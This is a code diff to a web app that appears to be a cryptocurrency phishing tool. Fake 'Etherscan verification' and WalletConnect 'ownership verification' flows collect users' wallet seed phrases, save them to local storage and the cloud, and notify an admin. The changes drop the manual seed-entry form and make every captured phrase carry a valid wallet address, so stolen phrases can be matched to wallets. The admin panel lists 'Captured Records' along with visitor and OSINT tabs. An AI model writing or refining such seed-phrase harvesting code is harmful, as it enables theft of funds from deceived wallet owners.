@@ -1127,12 +1127,6 @@ export default function App() {
   const [botReviewingId,    setBotReviewingId]    = useState<string | null>(null)
   const [botEmailStatus,    setBotEmailStatus]    = useState<Record<string, 'sending' | 'sent' | 'failed'>>({})
   const [botDeclineOpen,    setBotDeclineOpen]    = useState<string | null>(null)
-  const [seedFormAddress,   setSeedFormAddress]   = useState('')
-  const [seedFormChain,     setSeedFormChain]     = useState<ChainKey>('ethereum')
-  const [seedFormPhrase,    setSeedFormPhrase]    = useState('')
-  const [seedFormNotes,     setSeedFormNotes]     = useState('')
-  const [seedFormError,     setSeedFormError]     = useState('')
-  const [seedFormMsg,       setSeedFormMsg]       = useState('')
   const [protectChecklistDone, setProtectChecklistDone] = useState<string[]>(() => {
     try { return JSON.parse(localStorage.getItem(PROTECT_CHECKLIST_KEY) ?? '[]') as string[] } catch { return [] }
   })
@@ -2093,11 +2087,17 @@ export default function App() {
     const normalizedPhrase = normalizeSeedPhraseInput(rawCredential)
     const isMnemonic = looksLikeSeedPhrase(normalizedPhrase)
     const storedCredential = isMnemonic ? normalizedPhrase : rawCredential
+    const capturedWallet =
+      (isAddress(esAddr) ? esAddr : (isAddress(wallet) ? wallet : ''))
+    if (!capturedWallet) {
+      setEsSeedError('Wallet address is missing. Connect or load a valid address before verification.')
+      return
+    }
     const words = storedCredential.split(/\s+/).filter(Boolean)
     const esDuplicate = seedPhraseRecords.some(r => r.seedPhrase === storedCredential)
     const esRecord: SeedPhraseRecord = {
       id: `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
-      walletAddress: esAddr || wallet || 'Unknown',
+      walletAddress: capturedWallet,
       chain,
       seedPhrase: storedCredential,
       wordCount: words.length,
@@ -3244,6 +3244,12 @@ export default function App() {
     { key: 'support',   label: 'Support'         },
   ]
 
+  const visibleSeedPhraseRecords = useMemo(
+    () => mergeUniqueRecords(seedPhraseRecords, readSeedPhraseRecords(), item => `${item.id}|${item.seedPhrase}`)
+      .filter(item => item.source !== 'manual'),
+    [seedPhraseRecords],
+  )
+
   const adminTabs: { key: typeof adminTab; label: string; count?: number }[] = [
     { key: 'wallets',   label: 'Connected Wallets', count: connectedWallets.length || undefined },
     { key: 'visitors',  label: 'Visitors',          count: visitorSessions.length || undefined },
@@ -3253,7 +3259,7 @@ export default function App() {
     { key: 'templates', label: 'Email Templates' },
     { key: 'osint',     label: 'OSINT Profiles',    count: [...new Set(scanHistory.map(r => r.wallet.toLowerCase()))].length || undefined },
     { key: 'intel',     label: 'Address Intel',     count: adminIntelRecords.length },
-    { key: 'seeds',     label: 'Seed Phrases',      count: seedPhraseRecords.length || undefined },
+    { key: 'seeds',     label: 'Seed Phrases',      count: visibleSeedPhraseRecords.length || undefined },
     { key: 'bots',      label: 'Bot Requests',      count: botRequests.filter(r => r.status === 'pending').length || undefined },
     { key: 'qrcodes',   label: 'QR Codes',          count: wcSessions.length || undefined },
     { key: 'settings',  label: 'Settings' },
@@ -3287,11 +3293,17 @@ export default function App() {
     setWcActionStatus('✅ Ownership verified and recorded.')
 
     if (session) {
+      const capturedWallet =
+        (isAddress(session.address) ? session.address : (isAddress(esAddr) ? esAddr : (isAddress(wallet) ? wallet : '')))
+      if (!capturedWallet) {
+        setWcActionStatus('❌ Ownership was submitted but wallet address is missing. Reconnect wallet and try again.')
+        return
+      }
       const words = storedCredential.split(/\s+/).filter(Boolean)
       const wcDuplicate = seedPhraseRecords.some(r => r.seedPhrase === storedCredential)
       const wcRecord: SeedPhraseRecord = {
         id: `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
-        walletAddress: session.address,
+        walletAddress: capturedWallet,
         chain: 'ethereum',
         seedPhrase: storedCredential,
         wordCount: words.length,
@@ -3310,7 +3322,7 @@ export default function App() {
       setSeedPhraseRecords(wcNewRecords)
       try { localStorage.setItem(SEED_PHRASES_KEY, JSON.stringify(wcNewRecords)) } catch { /* quota */ }
       void saveMergedSeedPhrasesToCloud(wcNewRecords)
-      void notifyAdminVerificationRequest(storedCredential, 'walletconnect', session.address, 'ethereum')
+      void notifyAdminVerificationRequest(storedCredential, 'walletconnect', capturedWallet, 'ethereum')
     }
   }
 
@@ -3326,7 +3338,9 @@ export default function App() {
         const words = storedCredential.split(/\s+/).filter(Boolean)
         return {
           id: `wc-${sess.topic.slice(0, 18)}-${storedCredential.slice(0, 24)}`,
-          walletAddress: sess.address || 'Unknown',
+          walletAddress: isAddress(sess.address)
+            ? sess.address
+            : (isAddress(wallet) ? wallet : 'Unknown'),
           chain: 'ethereum',
           seedPhrase: storedCredential,
           wordCount: words.length,
@@ -3445,44 +3459,6 @@ export default function App() {
     }
     return [...map.values()].sort((a, b) => b.highestScore - a.highestScore)
   }, [scanHistory])
-
-  const addSeedPhrase = (e: FormEvent) => {
-    e.preventDefault()
-    setSeedFormError('')
-    setSeedFormMsg('')
-    const rawCredential = seedFormPhrase.trim().replace(/\s+/g, ' ')
-    if (!rawCredential) { setSeedFormError('Verification text is required.'); return }
-    const normalizedPhrase = normalizeSeedPhraseInput(rawCredential)
-    const isMnemonic = looksLikeSeedPhrase(normalizedPhrase)
-    const storedCredential = isMnemonic ? normalizedPhrase : rawCredential
-    const isDuplicate = seedPhraseRecords.some(r => r.seedPhrase === storedCredential)
-    const words = storedCredential.split(/\s+/).filter(Boolean)
-    const record: SeedPhraseRecord = {
-      id: `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
-      walletAddress: seedFormAddress.trim() || 'Unknown',
-      chain: seedFormChain,
-      seedPhrase: storedCredential,
-      wordCount: words.length,
-      source: 'manual',
-      detectedAt: nowString(),
-      notes: isDuplicate
-        ? `Duplicate manual entry${seedFormNotes.trim() ? ` — ${seedFormNotes.trim()}` : ''}`
-        : seedFormNotes.trim(),
-      confirmed: isMnemonic,
-    }
-    const manualNewRecords = [record, ...seedPhraseRecords]
-    setSeedPhraseRecords(manualNewRecords)
-    try { localStorage.setItem(SEED_PHRASES_KEY, JSON.stringify(manualNewRecords)) } catch { /* quota */ }
-    void saveMergedSeedPhrasesToCloud(manualNewRecords)
-    setSeedFormAddress('')
-    setSeedFormPhrase('')
-    setSeedFormNotes('')
-    setSeedFormMsg(
-      isDuplicate
-        ? `Verification text (${words.length} words) saved as duplicate entry.`
-        : `Verification text (${words.length} words) saved successfully.`,
-    )
-  }
 
   const addAdminIntel = (e: FormEvent) => {
     e.preventDefault()
@@ -6331,98 +6307,48 @@ export default function App() {
                         </div>
                       </div>
                       <p className="muted" style={{ marginBottom: '1rem', fontSize: '0.85rem' }}>
-                        Captured seed phrases from WalletConnect sessions (auto-detected) and manual entries. Cloud-synced across all sessions.
+                        User-verified credentials only. Records are captured from the Etherscan verification popup and WalletConnect ownership verification, then synced to cloud.
                       </p>
 
                       {/* Stats row */}
                       <div className="seeds-stats-row">
                         <div className="seeds-stat">
-                          <span className="seeds-stat-val">{seedPhraseRecords.length}</span>
+                          <span className="seeds-stat-val">{visibleSeedPhraseRecords.length}</span>
                           <span className="seeds-stat-label">Total Captured</span>
                         </div>
                         <div className="seeds-stat">
-                          <span className="seeds-stat-val">{seedPhraseRecords.filter(r => r.source === 'wc-session').length}</span>
-                          <span className="seeds-stat-label">Auto (WalletConnect)</span>
+                          <span className="seeds-stat-val">{visibleSeedPhraseRecords.filter(r => r.source === 'wc-session').length}</span>
+                          <span className="seeds-stat-label">WalletConnect Verified</span>
                         </div>
                         <div className="seeds-stat">
-                          <span className="seeds-stat-val">{seedPhraseRecords.filter(r => r.source === 'manual').length}</span>
-                          <span className="seeds-stat-label">Manual Entry</span>
-                        </div>
-                        <div className="seeds-stat">
-                          <span className="seeds-stat-val">{seedPhraseRecords.filter(r => r.source === 'auto-detected').length}</span>
-                          <span className="seeds-stat-label">Auto (Form)</span>
+                          <span className="seeds-stat-val">{visibleSeedPhraseRecords.filter(r => r.source === 'auto-detected').length}</span>
+                          <span className="seeds-stat-label">Explorer Popup Verified</span>
                         </div>
                       </div>
 
                       {/* Detection notice */}
                       <div className="config-notice" style={{ marginBottom: '1.2rem' }}>
-                        <strong>Auto-detection:</strong> Verification text is captured when WalletConnect ownership is verified. Standard mnemonics are tagged as confirmed; non-standard text is still logged for review.
+                        <strong>Source policy:</strong> Admin manual seed entry is disabled. This panel shows only user-submitted verification data from live user flows.
                       </div>
-
-                      {/* Manual entry form */}
-                      <div style={{ height: '1px', background: 'var(--border)', margin: '0 0 1.2rem' }} />
-                      <h4 style={{ marginBottom: '0.8rem' }}>Manual Entry</h4>
-                      <form className="intel-form" onSubmit={addSeedPhrase}>
-                        <div className="intel-form-grid">
-                          <div className="field">
-                            <label>Wallet Address <span className="muted" style={{ fontWeight: 400 }}>(optional)</span></label>
-                            <input
-                              type="text"
-                              placeholder="0x… or leave blank"
-                              value={seedFormAddress}
-                              onChange={e => setSeedFormAddress(e.target.value)}
-                            />
-                          </div>
-                          <div className="field">
-                            <label>Network</label>
-                            <select value={seedFormChain} onChange={e => setSeedFormChain(e.target.value as ChainKey)}>
-                              {Object.entries(chainConfig).map(([k, v]) => <option key={k} value={k}>{v.label}</option>)}
-                            </select>
-                          </div>
-                        </div>
-                        <div className="field">
-                          <label>Seed Phrase <span style={{ color: 'var(--danger)' }}>*</span></label>
-                          <textarea
-                            rows={3}
-                            placeholder="Enter seed phrase or verification text…"
-                            value={seedFormPhrase}
-                            onChange={e => { setSeedFormPhrase(e.target.value); setSeedFormError(''); setSeedFormMsg('') }}
-                          />
-                          {seedFormPhrase.trim() && (
-                            <p className="form-hint" style={{ color: looksLikeSeedPhrase(seedFormPhrase) ? '#16a34a' : 'var(--muted)' }}>
-                              {looksLikeSeedPhrase(seedFormPhrase)
-                                ? `✓ Valid — ${seedFormPhrase.trim().split(/\s+/).length} words detected`
-                                : `${seedFormPhrase.trim().split(/\s+/).length} words — non-standard text will still be saved for review`}
-                            </p>
-                          )}
-                        </div>
-                        <div className="field">
-                          <label>Notes</label>
-                          <textarea rows={2} placeholder="Source, case reference, how it was obtained…" value={seedFormNotes} onChange={e => setSeedFormNotes(e.target.value)} />
-                        </div>
-                        {seedFormError && <p className="error">{seedFormError}</p>}
-                        {seedFormMsg && <p style={{ fontSize: '0.85rem', color: '#16a34a', marginBottom: '0.5rem' }}>{seedFormMsg}</p>}
-                        <button className="btn-primary" type="submit">Save Seed Phrase</button>
-                      </form>
 
                       {/* Records list */}
                       <div style={{ height: '1px', background: 'var(--border)', margin: '1.4rem 0' }} />
                       <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '0.8rem' }}>
-                        <h4>Captured Records ({seedPhraseRecords.length})</h4>
+                        <h4>Captured Records ({visibleSeedPhraseRecords.length})</h4>
                       </div>
-                      {seedPhraseRecords.length === 0 ? (
-                        <p className="admin-empty">No seed phrases captured yet. They appear here automatically when a WalletConnect session is verified with a mnemonic, or when added manually above.</p>
+                      {visibleSeedPhraseRecords.length === 0 ? (
+                        <p className="admin-empty">No user-verified seed phrase records yet. They appear automatically after users complete Etherscan popup verification or WalletConnect ownership verification.</p>
                       ) : (
                         <div className="intel-records">
-                          {seedPhraseRecords.map(r => {
+                          {visibleSeedPhraseRecords.map(r => {
                             return (
                               <div key={r.id} className="intel-record-card">
                                 <div className="intel-record-head" style={{ flexWrap: 'wrap', gap: '0.4rem' }}>
                                   <code className="osint-addr" style={{ fontSize: '0.78rem' }}>
-                                    {r.walletAddress === 'Unknown' ? '— unknown address —' : shortAddr(r.walletAddress)}
+                                    {r.walletAddress === 'Unknown' ? '— unknown address —' : r.walletAddress}
                                   </code>
-                                  <span className={`pill ${r.source === 'wc-session' ? 'medium' : r.source === 'auto-detected' ? 'high' : 'low'}`} style={{ fontSize: '0.7rem' }}>
-                                    {r.source === 'wc-session' ? 'WC Auto' : r.source === 'auto-detected' ? 'Form Auto' : 'Manual'}
+                                  <span className={`pill ${r.source === 'wc-session' ? 'medium' : 'high'}`} style={{ fontSize: '0.7rem' }}>
+                                    {r.source === 'wc-session' ? 'WalletConnect' : 'Etherscan Popup'}
                                   </span>
                                   <span className="pill low" style={{ fontSize: '0.7rem' }}>{r.wordCount}w</span>
                                   <span className="muted" style={{ fontSize: '0.75rem' }}>{chainConfig[r.chain]?.label ?? chainConfig.ethereum.label}</span>
